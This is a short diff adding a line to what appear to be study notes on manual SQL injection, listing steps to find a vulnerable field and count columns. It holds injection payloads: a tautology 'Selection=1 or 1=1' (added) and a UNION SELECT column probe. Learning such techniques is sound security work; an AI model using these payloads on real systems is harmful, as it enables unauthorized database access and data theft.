@@ -121,6 +121,7 @@ check network while inspecting element, request tab for the post request, take r
     SELECT <column,names> from database.columnname
     
 ## step 1 Identify Vulnerbale Field
+    Selection=1 or 1=1
 ## step 2 Identify Number of Columns
 match Number of options to the number columns
     Audi' UNION SELECT 1,2,3,4,5 #
